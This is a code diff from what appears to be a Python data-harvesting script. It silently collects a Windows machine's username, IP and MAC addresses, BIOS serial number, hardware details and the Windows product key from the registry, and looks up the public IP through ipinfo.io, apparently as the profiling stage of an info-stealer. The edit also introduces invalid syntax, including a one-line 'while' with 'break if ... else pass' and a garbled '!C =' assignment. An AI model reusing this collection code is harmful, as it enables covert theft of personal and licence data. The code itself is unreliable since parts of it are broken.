@@ -16,11 +16,7 @@ def is_cnx_active(): #checking internet connection
         return True
     except: 
         return False
-while True: #waiting for internet connection
-    if is_cnx_active() is True:
-        break
-    else:
-        pass
+while True: break if is_cnx_active() else pass #waiting for internet connection
 #system data
 osinfo = platform.uname();architecture = platform.architecture();name = getpass.getuser();host = osinfo.node;ip = socket.gethostbyname(host);osname = osinfo.system;processor = osinfo.machine;release = osinfo.release;version = osinfo.version;mac = getmac();biosSN = subprocess.check_output("WMIC BIOS GET SERIALNUMBER").decode('utf-8').replace("SerialNumber", "");biosMF = subprocess.check_output("WMIC BIOS GET Manufacturer").decode('utf-8').replace("urer", "");biosV = subprocess.check_output("WMIC BIOS GET Version").decode('utf-8').replace("Version", "");Dir = subprocess.check_output("WMIC BOOTCONFIG GET BootDirectory").decode('utf-8').replace("BootDirectory", "");processorfrq = psutil.cpu_freq();timezone = psutil.boot_time()!C = psutil.disk_usage("/");Path = winreg.HKEY_LOCAL_MACHINE;ProductKeyPath = winreg.OpenKeyEx(Path, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform");ProductKey = winreg.QueryValueEx(ProductKeyPath, "BackupProductKeyDefault");ipinfo = json.loads(requests.get('http://ipinfo.io/json').text);
 vpnapiio_key = "" # API key from vpnapi.io
